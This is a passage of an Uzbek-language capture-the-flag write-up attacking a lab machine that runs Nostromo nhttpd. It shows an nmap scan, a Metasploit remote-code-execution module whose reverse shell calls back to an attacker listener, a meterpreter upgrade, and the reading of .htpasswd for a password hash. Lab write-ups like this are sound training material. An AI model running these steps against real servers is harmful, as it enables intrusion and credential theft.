**Reconnaissance**  
`nmap -sV 10.129.1.193`  

![image](https://github.com/user-attachments/assets/d4b5a5f1-cc1f-49e9-a43c-cc3fa038a1cf)  

Port 80 ochiq bo‘lgani uchun brauzer orqali 10.129.1.193 IP-manzilini tekshirib chiqamiz, ammo foydali narsani topa olmaymiz.  

![image](https://github.com/user-attachments/assets/e0ffbe0d-c885-42ba-95b9-7b9182b5ea06)  

**Exploitation**  
Zaiflikdan foydalanish uchun Metasploit Framework dan foydalanamiz. Biz `Nostromo <= 1.9.6` versiyasidagi masofadan kod bajarish (RCE) zaifligini ekspluatatsiya qiluvchi modulni topdik. Ushbu muammo nostromo nhttpd ning `http_verify` funksiyasidagi directory traversal tufayli yuzaga keladi, bu esa tajovuzkorga maxsus yaratilgan HTTP so‘rovi orqali masofadan kod bajarishga imkon beradi.  

```
use exploit/multi/http/nostromo_code_exec
set rhosts 10.129.1.193
set lhost 10.10.14.52
exploit
```  
![image](https://github.com/user-attachments/assets/a4b19893-685d-42e9-8ffe-0ec6c7e25445)

Agar siz birinchi bo‘lib zaiflikdan foydalangan bo‘lsangiz, Metasploit’da `1-ID` bilan sessiya ochiladi. Uni meterpreter ga o‘tkazish uchun `sessions -u 1` buyrug‘idan foydalanasiz. Keyin, yangi meterpreter sessiyasiga ulanish uchun `sessions 2` buyrug‘ini kiritasiz.  

```
sessions -u 1
sessions 2
```  

Ushbu buyruqlar yordamida biz meterpreter shell olamiz. Keyin `/var` katalogiga o‘tib, undagi fayllarni tekshiramiz. Bu yerda `nostromo` katalogi mavjud.  
```
cd /var
ls
cd nostromo
ls
```  
![image](https://github.com/user-attachments/assets/5a112b8e-f427-42f0-9f4f-02c7ea3a6df5)   

`.htpasswd` faylini ko‘rib, `David` foydalanuvchisi va uning xeshlangan paroli ni topamiz.
Keyin Davidning `home` katalogiga o‘tib, `protected-file-area` nomli qiziqarli katalogni topamiz. Ushbu katalogda `backup-ssh-identify-files.tgz` arxivi bor. Uni yuklab olamiz.  
```
cd conf
ls
cat .htpasswd
cat nhttpd.conf
```   
![image](https://github.com/user-attachments/assets/35f759a8-b731-4bb0-97df-899e0f2bed94)   


